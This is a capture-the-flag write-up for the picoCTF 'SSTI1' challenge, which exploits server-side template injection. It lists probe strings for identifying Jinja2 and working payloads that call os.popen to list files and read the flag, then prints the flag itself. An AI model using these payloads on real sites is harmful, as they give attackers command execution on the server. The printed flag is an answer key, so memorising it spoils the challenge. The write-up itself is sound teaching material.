# [SSTI1](https://play.picoctf.org/practice/challenge/492)

## Challenge Information
- **Category**: Web Exploitation
- **Difficulty**: Easy
- **Description**: I made a cool website where you can announce whatever you want! Try it out!

## Solution Overview
Server-Side Template Injection (SSTI) is a vulnerability that occurs when user-supplied input is processed by a template engine without proper sanitization. In this challenge, we'll exploit an SSTI vulnerability to retrieve the flag.

## Hints
- Server Side Template Injection

## Detailed Walkthrough

### Initial Analysis
#### Web Application Interaction
1. Launch the challenge instance
2. Observe the web page that accepts user input
3. Notice that the input is reflected back on the page

### Exploitation/Solution Steps
1. **Step 1**: Identify the Template Engine:

    ```
    ${7*7}
    {{7*7}}
    a{*comment*}b
    ${"z".join("ab")}
    {{7*'7'}}
    ```

    Based on the input, {{7*7}} works, so it must be either Jinja or Twig. By testing {{7*'7'}}, we get 7777777, so it is Jinja2.

2. **Step 2**: Prepare the exploits
   - List the directory to find any relevant flag file:
   
        ```
        {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
        ```
   
        The output of this command reveals the following files:
        ```
        __pycache__
        app.py
        flag
        requirements.txt
        ```
   
   - Read the flag file:
   
        ```
        {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
        ```

### Key Insights
- Understanding how different template engines parse input helps in exploiting SSTI vulnerabilities.
- Jinja2-based SSTI allows arbitrary code execution, making it highly dangerous.
- Checking for execution of mathematical expressions (`7*7`) helps confirm SSTI vulnerabilities.

## Tools and Resources Used
- [Server Side Template Injection (SSTI)](https://www.pwny.cc/web-attacks/server-side-template-injection-ssti)

## Flag
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_753eca43}
```

## Learning Points
- How SSTI vulnerabilities work
- Identifying and exploiting Jinja2-based SSTI
- Importance of input sanitization in template engines

## Potential Improvements
- Always use input validation and sanitization
- Automating SSTI detection using Burp Intruder or a custom script

## References
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
- [Server Side Template Injection (SSTI)](https://www.pwny.cc/web-attacks/server-side-template-injection-ssti)